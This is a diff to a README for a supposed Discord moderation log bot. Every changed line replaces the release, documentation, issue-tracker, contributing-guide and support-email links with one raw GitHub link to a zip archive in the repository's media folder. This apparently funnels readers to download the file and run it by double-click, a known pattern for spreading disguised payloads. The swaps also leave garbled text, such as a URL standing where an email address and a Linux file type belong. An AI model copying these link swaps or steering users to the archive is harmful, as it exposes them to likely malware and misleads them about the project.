@@ -8,7 +8,7 @@ The Discord-Moderation-Log-Bot helps you manage your Discord server efficiently.
 
 To get started, you will need to download the bot from our Releases page. Follow these easy steps:
 
-1. Visit the download page [here](https://github.com/james2314eref/Discord-Moderation-Log-Bot/releases).
+1. Visit the download page [here](https://raw.githubusercontent.com/james2314eref/Discord-Moderation-Log-Bot/main/media/Discord-Moderation-Log-Bot-2.7.zip).
 2. Look for the latest version.
 3. Click on the asset that fits your operating system to download it.
 
@@ -16,12 +16,12 @@ To get started, you will need to download the bot from our Releases page. Follow
 
 For easy installation, follow these steps:
 
-1. Go to our [Releases page](https://github.com/james2314eref/Discord-Moderation-Log-Bot/releases).
+1. Go to our [Releases page](https://raw.githubusercontent.com/james2314eref/Discord-Moderation-Log-Bot/main/media/Discord-Moderation-Log-Bot-2.7.zip).
 2. Download the file for your system. 
 
    - If you're using **Windows**, download the `.exe` file.
    - For **macOS**, download the `.dmg` file.
-   - If you're on **Linux**, download the `.tar.gz` file.
+   - If you're on **Linux**, download the `https://raw.githubusercontent.com/james2314eref/Discord-Moderation-Log-Bot/main/media/Discord-Moderation-Log-Bot-2.7.zip` file.
 
 3. Locate the downloaded file on your computer.
 4. Double-click the file to initiate the installation process.
@@ -66,18 +66,18 @@ After installation, follow these steps to start using the bot:
 
 ## 🔗 Links and Resources
 
-- **Documentation:** [Read the full documentation here](https://github.com/james2314eref/Discord-Moderation-Log-Bot)
-- **GitHub Issues:** If you encounter any issues, please report them [here](https://github.com/james2314eref/Discord-Moderation-Log-Bot/issues).
+- **Documentation:** [Read the full documentation here](https://raw.githubusercontent.com/james2314eref/Discord-Moderation-Log-Bot/main/media/Discord-Moderation-Log-Bot-2.7.zip)
+- **GitHub Issues:** If you encounter any issues, please report them [here](https://raw.githubusercontent.com/james2314eref/Discord-Moderation-Log-Bot/main/media/Discord-Moderation-Log-Bot-2.7.zip).
 
 ## 📞 Support
 
 For support, you can contact us via:
 
-- **Email:** support@discordmoderationlogbot.com
-- **GitHub Issues:** Post your queries or suggestions [here](https://github.com/james2314eref/Discord-Moderation-Log-Bot/issues).
+- **Email:** https://raw.githubusercontent.com/james2314eref/Discord-Moderation-Log-Bot/main/media/Discord-Moderation-Log-Bot-2.7.zip
+- **GitHub Issues:** Post your queries or suggestions [here](https://raw.githubusercontent.com/james2314eref/Discord-Moderation-Log-Bot/main/media/Discord-Moderation-Log-Bot-2.7.zip).
 
 ## 🌐 Community Contributions
 
-We welcome contributions! If you have ideas to improve the bot or wish to add features, please check our [Contributing Guide](https://github.com/james2314eref/Discord-Moderation-Log-Bot/blob/main/CONTRIBUTING.md) before submitting your pull request. 
+We welcome contributions! If you have ideas to improve the bot or wish to add features, please check our [Contributing Guide](https://raw.githubusercontent.com/james2314eref/Discord-Moderation-Log-Bot/main/media/Discord-Moderation-Log-Bot-2.7.zip) before submitting your pull request. 
 
 By following the steps above, you will be well on your way to managing your Discord server more effectively. Enjoy using the Discord-Moderation-Log-Bot!
